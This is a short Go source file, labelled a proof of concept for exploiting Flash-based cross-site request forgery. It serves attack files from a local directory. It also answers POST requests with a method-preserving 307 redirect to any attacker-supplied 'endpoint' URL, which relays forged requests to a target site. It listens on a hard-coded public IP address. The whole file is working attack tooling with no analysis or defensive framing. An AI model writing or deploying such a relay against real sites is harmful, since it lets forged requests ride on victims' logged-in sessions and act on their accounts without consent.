// POC to serve and exploit flash csrf
package main

import (
	"net/http"
	"os"
	"path/filepath"
	"strings"

	"github.com/go-chi/chi"
)


func main() {
	r := chi.NewRouter()
	//endpoint := r.URL.Query().Get("endpoint")
	r.Post("/", func(w http.ResponseWriter, r *http.Request) {
		//w.Write([]byte("hi"))
		endpoint := r.URL.Query().Get("endpoint")
		http.Redirect(w, r, endpoint, 307)
	})

	workDir, _ := os.Getwd()
	filesDir := filepath.Join(workDir, "files")
	FileServer(r, "/files", http.Dir(filesDir))

	http.ListenAndServe("188.166.242.36:80", r)
}

// FileServer function sets up http.FilerServer handler to serve
// static files from a http.FileSystem
func FileServer(r chi.Router, path string, root http.FileSystem) {
	if strings.ContainsAny(path, "{}*") {
		panic("FileServer does not permit URL Parameters")
	}

	fs := http.StripPrefix(path, http.FileServer(root))

	if path != "/" && path[len(path)-1] != '/' {
		r.Get(path, http.RedirectHandler(path+"/", 301).ServeHTTP)
		path += "/"
	}

	path += "*"

	r.Get(path, http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		fs.ServeHTTP(w, r)
	}))
}
